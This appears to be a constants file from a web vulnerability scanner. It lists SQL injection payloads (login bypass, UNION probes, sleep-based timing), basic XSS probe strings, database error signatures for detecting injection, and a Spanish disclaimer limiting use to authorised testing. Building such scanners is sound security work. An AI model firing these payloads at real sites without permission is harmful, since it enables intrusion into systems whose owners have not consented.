
import { VulnerabilityType, Payload } from './types';

export const SQLI_PAYLOADS: string[] = [
  "' OR '1'='1",
  '" OR "1"="1',
  "admin'--",
  "admin' #",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' AND 1=1--",
  "sleep(5)#",
];

export const XSS_PAYLOADS: string[] = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "'\"><script>alert(1)</script>",
  "<svg/onload=alert(1)>",
];

export const SQL_ERROR_SIGNATURES = [
  "SQL syntax",
  "mysql_fetch_array",
  "ORA-01756",
  "SQLite3::query",
  "PostgreSQL query failed",
  "Microsoft OLE DB Provider for SQL Server",
  "Incorrect syntax near",
];

export const EDUCATIONAL_DISCLAIMER = `DESCARGO DE RESPONSABILIDAD: Esta herramienta es SOLO para fines educativos y pruebas de seguridad autorizadas. Ejecutar este script contra objetivos sin permiso explícito por escrito es ilegal y poco ético. El desarrollador no asume ninguna responsabilidad por el mal uso.`;
